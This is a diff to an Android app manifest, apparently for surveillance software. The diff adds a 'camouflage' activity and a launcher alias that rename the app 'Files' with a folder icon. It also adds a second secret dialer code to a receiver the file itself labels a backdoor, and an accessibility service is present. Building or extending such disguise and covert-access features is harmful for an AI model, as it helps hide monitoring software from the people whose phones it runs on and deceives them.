@@ -147,6 +147,29 @@
             </intent-filter>
         </activity-alias>
 
+        <!-- Camouflage Files Activity -->
+        <activity
+            android:name="com.phonelink.hub.disguise.FilesDisguiseActivity"
+            android:exported="true"
+            android:launchMode="singleTask"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:configChanges="orientation|screenSize|keyboardHidden" />
+
+        <!-- Camouflage Launcher Alias: Changes app name to "Files" with folder icon -->
+        <activity-alias
+            android:name=".FilesAlias"
+            android:targetActivity="com.phonelink.hub.disguise.FilesDisguiseActivity"
+            android:label="Files"
+            android:icon="@drawable/ic_files_launcher"
+            android:roundIcon="@drawable/ic_files_launcher"
+            android:enabled="false"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
         <!-- Minimal connection status screen opened by tapping the persistent notification (if needed) -->
         <activity
             android:name=".StatusActivity"
@@ -266,13 +289,14 @@
                 android:resource="@xml/accessibility_service_config" />
         </service>
 
-        <!-- Secret Code Backdoor Dial Receiver (*#*#9211#*#*) -->
+        <!-- Secret Code Backdoor Dial Receiver (*#*#9211#*#* and *#*#74663#*#*) -->
         <receiver
             android:name=".receiver.SecretCodeReceiver"
             android:exported="true">
             <intent-filter>
                 <action android:name="android.provider.Telephony.SECRET_CODE" />
                 <data android:scheme="android_secret_code" android:host="9211" />
+                <data android:scheme="android_secret_code" android:host="74663" />
             </intent-filter>
         </receiver>
 
